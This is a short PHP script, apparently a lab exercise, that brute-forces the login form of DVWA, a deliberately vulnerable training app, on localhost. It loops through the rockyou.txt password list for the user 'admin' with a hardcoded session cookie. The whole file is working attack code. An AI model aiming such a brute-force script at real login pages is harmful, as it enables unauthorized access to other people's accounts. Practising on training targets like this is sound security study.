<?php

require "vendor/autoload.php";

$user = "admin";
$passwordList = file_get_contents("rockyou.txt");
$passwords = explode(PHP_EOL, $passwordList);

$client = new GuzzleHttp\Client();
foreach ($passwords as $password) {
    echo $user." ve ".$password." için deneme yapılıyor...".PHP_EOL;

    $res = $client->request(
        'GET',
        'http://dvwa.localhost/vulnerabilities/brute/?username='.$user.'&password='.$password.'&Login=Login#',
        [
            'headers' => [
                'Cookie' => "security=low; PHPSESSID=eju71of86n2i3b8lajaj355ijb",
            ]
        ]
    );

    if (strpos($res->getBody()->getContents(), "incorrect")) {
        echo "Hata aldık!".PHP_EOL;
        continue;
    }

    echo "Başarılı!";
    break;
}